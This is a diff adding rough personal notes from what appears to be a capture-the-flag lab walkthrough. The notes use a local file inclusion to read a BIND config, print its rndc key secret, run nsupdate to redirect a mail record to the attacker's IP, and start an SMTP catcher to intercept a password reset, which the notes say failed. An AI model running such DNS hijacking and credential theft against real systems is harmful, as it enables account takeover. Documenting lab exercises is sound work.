@@ -96,3 +96,64 @@ Accept-Language: en-US,en;q=0.9
 Connection: close
 
 
+we know lfi wxists tso the way to get ot the configuration key is by looking into /etc/bind/named.conf
+
+```
+// This is the primary configuration file for the BIND DNS server named.
+//
+// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
+// structure of BIND configuration files in Debian, *BEFORE* you customize 
+// this configuration file.
+//
+// If you are just adding zones, please do that in /etc/bind/named.conf.local
+
+include "/etc/bind/named.conf.options";
+include "/etc/bind/named.conf.local";
+include "/etc/bind/named.conf.default-zones";
+
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};
+
+exploit mail dns
+
+ nsupdate                  
+> server 10.10.11.212 53
+> key hmac-sha256:rndc-key BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
+> zone snoopy.htb
+> update add mail.snoopy.htb 86400 A 10.10.16.47
+> send
+
+starting python smtpd server
+
+python3 -m smtpd -c DebuggingServer -n 10.10.16.47:25
+
+we added mm.snoopy.htb
+
+a matter most page opens
+
+![](20230715060719.png)
+
+then we go and reset our password
+
+we reset password for at password reset page
+
+cschultz@snoopy.htb
+
+but not able to
+
+![](20230715060913.png)
+
+nothing came maybe because we did not transfer the zone properly before
+
+
+
+
+
+
+
+
+
+```
+
